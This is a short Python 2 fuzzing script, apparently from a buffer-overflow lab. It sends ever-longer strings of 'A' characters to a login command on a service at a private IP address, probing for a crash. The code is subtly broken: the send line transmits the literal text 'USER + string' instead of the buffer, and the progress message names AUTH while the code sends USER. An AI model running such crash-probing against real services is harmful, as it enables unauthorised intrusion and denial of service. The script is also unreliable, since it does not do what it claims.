#!/usr/bin/python

import socket

# create an array of buffers while incrementing them.

buffer=["\x41"]
counter=100
while len(buffer) <=30:
    buffer.append("\x41"*counter)
    counter=counter+200

for string in buffer:
    print "Fuzzing AUTH with %s bytes" % len(string)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect(('192.168.15.25',5555))
    s.recv(1024)
    s.send('USER + string\r\n')
    s.recv(1024)
    s.send('QUIT\r\n')
    s.close()
